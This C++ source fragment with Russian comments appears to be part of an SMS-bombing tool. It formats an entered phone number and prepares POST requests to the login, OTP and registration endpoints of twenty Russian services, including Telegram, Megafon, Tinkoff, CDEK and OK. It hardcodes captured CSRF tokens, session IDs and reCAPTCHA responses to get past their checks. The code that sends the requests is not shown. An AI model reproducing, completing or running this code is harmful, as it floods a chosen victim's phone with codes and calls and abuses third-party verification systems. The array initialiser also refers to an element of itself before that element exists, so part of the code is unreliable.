string enteredPhone;
string phone;

class Service
{
    public:
        string name, url, data;

        //Конструктор
        Service(string name, string url)
        {
            this->name = name;
            this->url = url;
        }

        void setData(string parameter, string data)
        {
            if(this->data.empty()){this->data = parameter + "=" + data;}
            else{this->data += "&" + parameter + "=" + data;}
        }

        //Форматирует номер телефона под нужды сервиса
        void formatPhone(int type)
        {
            phone.clear();
            for(int i=0; i<11; i++)
            {
                switch(type)
                {
                    //7(***)*******
                    case 1:
                        switch(i)
                        {
                            case 1:
                                phone += "(";
                                break;

                            case 4:
                                phone += ")";
                                break;
                        }   
                        break;

                    //7(***)***-**-**
                    case 2:
                        switch(i)
                        {
                            case 1:
                                phone += "(";
                                break;

                            case 4:
                                phone += ")";
                                break;

                            case 7:
                                phone += "-";
                                break;

                            case 9:
                                phone += "-";
                                break;
                        }
                        break;

                    //7 (***) ***-**-**
                    case 3:
                        switch(i)
                        {
                            case 1:
                                phone += " (";
                                break;

                            case 4:
                                phone += ") ";
                                break;

                            case 7:
                                phone += "-";
                                break;

                            case 9:
                                phone += "-";
                                break;
                        }
                        break;

                    //7 *** ***-**-**
                    case 4:
                        switch(i)
                        {
                            case 1:
                                phone += " ";
                                break;

                            case 4:
                                phone += " ";
                                break;

                            case 7:
                                phone += "-";
                                break;

                            case 9:
                                phone += "-";
                                break;
                        }
                        break;

                    //7 *** *** ** **
                    case 5:
                        switch(i)
                        {
                            case 1:
                                phone += " ";
                                break;

                            case 4:
                                phone += " ";
                                break;

                            case 7:
                                phone += " ";
                                break;

                            case 9:
                                phone += " ";
                                break;
                        }
                        break;

                    //7 *** *** ****
                    case 6:
                        switch(i)
                        {
                            case 1:
                                phone += " ";
                                break;

                            case 4:
                                phone += " ";
                                break;

                            case 7:
                                phone += " ";
                                break;
                        }
                        break;
                }
                phone += enteredPhone[i];
            }
        }

        string setPhone()
        {
            formatPhone(0);
            return phone;
        }
        string setPhone(int numberType)
        {
            formatPhone(numberType);
            return phone;
        }
};

//Объявляется сервисы при помощи конструктора
Service Services[] =
{
    [0] = Service("Sunlight", "https://api.sunlight.net/v3/customers/authorization/"),
    [1] = Service("Dixy", "https://dostavka.dixy.ru/ajax/mp-auth-test.php"),
    [2] = Service("apteka_ot_sklada","https://apteka-ot-sklada.ru/apie/auth/request"),
    [3] = Service("Apteka.ru","https://api.apteka.ru/Auth/Auth_Code"),
    [4] = Service("MyGames","https://account.my.games/signup_phone_init/"),
    [5] = Service("CDEK", "https://www.cdek.ru/api-site/auth/send-code"),
    [6] = Service("LiniiLubvi", "https://liniilubvi.ru/personal/profile/"),
    [7] = Service("Hoff", "https://hoff.ru/vue/register/"),
    [8] = Service("Dns", "https://www.dns-shop.ru/auth/auth/fast-authorization/"),
    [9] = Service("MegafonTV", "https://bmp.megafon.tv/api/v10/auth/register/msisdn"),
    [10] = Service("Vkusno i Tochka", "https://site-api.vkusnoitochka.ru/api/v1/user/login/phone"),
    [11] = Service("Telegram", "https://my.telegram.org/auth/send_password"),
    [12] = Service("Bandeatos", "https://bandeatos.ru/?MODE=AJAX"),
    [13] = Service("FindClone", string("https://findclone.ru/register?phone=") + "+" + Services[13].setPhone()),
    [14] = Service("Eldarado", "https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php"),
    [15] = Service("Megafon", "https://lk.megafon.ru/api/auth/otp/request"),
    [16] = Service("nn-card", "https://nn-card.ru/api/1.0/register"),
    [17] = Service("OK", "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone"),
    [18] = Service("Tinkoff", "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35"),
    [19] = Service("Magnit", "https://new.moy.magnit.ru/local/ajax/login/"),
};

void initServices()
{
    //Заполняются данные сервисов
    for(int i=0; i<sizeof(Services)/sizeof(Services[0]); i++)
    {
        switch(i)
        {
            case 0:
                Services[i].setData("flashcall", "true");
                Services[i].setData("phone", "+" + Services[i].setPhone());
                break;
            
            case 1:
                Services[i].setData("phone", "+" + Services[i].setPhone());
                Services[i].setData("licenses_popup", "Y");
                Services[i].setData("licenses_popup1", "Y");
                Services[i].setData("licenses_popup2", "Y");
                break;

            case 2:
                Services[i].setData("phone", Services[i].setPhone());
                break;

            case 3:
                Services[i].setData("phone", Services[i].setPhone(3));
                Services[i].setData("u", "U");
                break;

            case 4:
                Services[i].setData("csrfmiddlewaretoken", "LNZGCkmqDohPMa3Xx1oQmyvQIDM2a99Qn2uC3ry5hcsGBvNvVNCyjQQGPOVQ6HdJ");
                Services[i].setData("continue", "https://account.my.games/profile/userinfo/");
                Services[i].setData("lang", "ru_RU");
                Services[i].setData("adId", "0");
                Services[i].setData("phone", Services[i].setPhone());
                Services[i].setData("password", "gdgdgdgdhdhrrhrjtjyyyju");
                Services[i].setData("method", "phone");
                break;

            case 5:
                Services[i].setData("locale", "ru");
                Services[i].setData("websiteId", "ru");
                Services[i].setData("phone", "+" + Services[i].setPhone());
                Services[i].setData("token", "03AAYGu2QrnoWNmX0mOstei7goYq6UfjQwSTZuqrr09EGI30i-zDjvzKwL6dD58NX8udcnquwgKmqHl4PpIcYVhdWQ3ThpWLUQpEJwdLNDgEY922ZiLvYHiCvONllOfAZzdf3589FoduoRXJv2OOK9O_ks6ZhgKDuMM4J8IIHE7DEC2lDK4VrNJ2h3gateXEukKA6nnjxn28Fp6W-zBsGTHZ8Ov_-YROd1sgrmIVRr3pAIXeAjGwkdzd0w4RCvIaZvU_iq1G3Q2RXixBB6PvoWJeFWHSKwhyMNY50Kad_rw6TsMdj-g74hYyFxk6HuK4S6hIPXEPO7eqNYCPNNZdGsPf6OYpDKmDPOz-3yfs4JqfKk2y01XHLEQRHFhKKx-XpTHivTOa7G37aWikMNXMcG8FvM50BQ6eUr9Dx5Ab34SGzALyGNZsI4f0wtXpJ9iynYus_MuS70ajbVgOQ0wPi6fcabAVtkDYAcqO10EybiOAGScKqP-Jwj-KWO6-tQxnBMhlW8ZHW6OzhJDKVJWZnJmTjEUuuVucev-DZCz4q70PD0DHFQShB-WOHWAAWFLN91SYBqN8QlBias");
                break;

            case 6:
                Services[i].setData("state", "3");
                Services[i].setData("phone", Services[i].setPhone());
                break;

            case 7:
                Services[i].setData("phone", "+" + Services[i].setPhone(5));
                break;

            case 8:
                Services[i].setData("FastAuthorizationLoginLoadForm[login]", Services[i].setPhone());
                Services[i].setData("FastAuthorizationLoginLoadForm[token]", "");
                Services[i].setData("FastAuthorizationLoginLoadForm[isPhoneCall]", "1");
                break;

            case 9:
                Services[i].setData("msisdn", "+" + Services[i].setPhone());
                Services[i].setData("password", "123456");
                break;

            case 10:
                Services[i].setData("number", "+" + Services[i].setPhone());
                Services[i].setData("g-recaptcha-response", "03AAYGu2RFqyOep0iDEGQ0_w9kYc8iSZPwdrbwi8gztxSNhedYvw_cwgqvNnuQo4J61SSUKakXtmF-s1qeHxnP4uB-07atojmtlR5qxW5KWND3jhohrOuijh-8UKgWHnPgn7fDkWUE8TjmVBdjVu7Nhwn2xs2qmNIoiC3nRafRqq82tK6S8mc92AG7t9G1M8dG9L4tCu27o97y52DPx87etGhdqcSNPPbSg4sGM9PnagJimawzaQbRRG5P-NARtu_YzPxSWC8dTeVbFXuUh8KIEhpuG62eQBLA-eWdZ34Hw48EPxCEnR6OroJ-2iLKPoBsTsY81PT5DCD3jdnwGBMGsapzMOstwFGQ3DWk9YzrEQB8DmfjSpQESQK_1tko5yigCEeQ3VCRCezimOJzFksQbYXtDaXiGqKQon3LEG4XbCRDvZxEW31PrFZNJVdXlkCN6d2zV0eTbGwvlsA-3o2NCD9M1BcbUje1NHqHPVicDJLy8K8PIAp5tncNGT9zFA9L6xC0xylAflt5EqKx_0h_lDhqxIRuXFp_ZWyMeFY9iz1VU3GLZM8x8MgD-hf8-mCzAx2ICdd8bBjp");
                break;

            case 11:
                Services[i].setData("phone", "+" + Services[i].setPhone());
                break;

            case 12:
                Services[i].setData("sessid", "33cb0da10458e38836e48a6fa4d16a8b");
                Services[i].setData("FORM_ID", "bx_1789522556_form");
                Services[i].setData("PHONE_NUMBER", "+" + Services[i].setPhone());
                break;

            case 13:
                Services[i].setData("phone", Services[i].setPhone());
                break;

            case 14:
                Services[i].setData("user_login", "+" + Services[i].setPhone(6));
                break;

            case 15:
                Services[i].setData("login", Services[i].setPhone());
                break;

            case 16:
                Services[i].setData("phone", Services[i].setPhone());
                Services[i].setData("password", "12345678");
                Services[i].setData("token", "03AAYGu2QlYNZ9HUrRMg-_AMpfTzUdL9O_aNA-2rkYr5_xCT91Wg2DclQAWSqcLcIsL31q_9PIaBh91EqOqMxOhIjw5uQR-pWFsiPDKY6ktaY1pugpLfK4sxJkqvNWRJGKqChcxRPKGcNO5co9zvPSiPieKndNiECOUKaxkDMIdDBLOrsIthzaS7nwnopVcxcbkwKHElXLoqqpsN96iRCk7a5cWSOlxjAXn0hGTSMLJkMoUXx-8zH9sdOVH5jnkLt7-C6fuUmCZ7gMsjwbQRAnN96qRNbB9S4s9HZYX2pkcG_a_93MP2RhtY_HqSYB6OnResP5cGHKrAeJ7K7fz5T1En_Yf-J-XjG41kKLXBtWkRwlVC0D6F8WJ7lzhJSmkachWgguBBYtw7qCUKYStA8fv04YJgnAiNOHcinXfNlYgAENUrzHoQae9UInpnla_90XWSzriadU3iwbLIedSBIzUom82e4abY3_Qxy7ANTErjRqcs1UuUPul3-CImWu-kbIxKBFvXEy_ieXHGIU4x3BHpfspLO5KeD4BA");
                break;

            case 17:
                Services[i].setData("st.r.phone", "+" + Services[i].setPhone());
                break;

            case 18:
                Services[i].setData("phone", Services[i].setPhone());
                break;

            case 19:
                Services[i].setData("phone", "+" + Services[i].setPhone());
                Services[i].setData("ksid", "ee191257-a4fe-4e39-9f0f-079c7f721eee_0");
                break;
        }
    }
}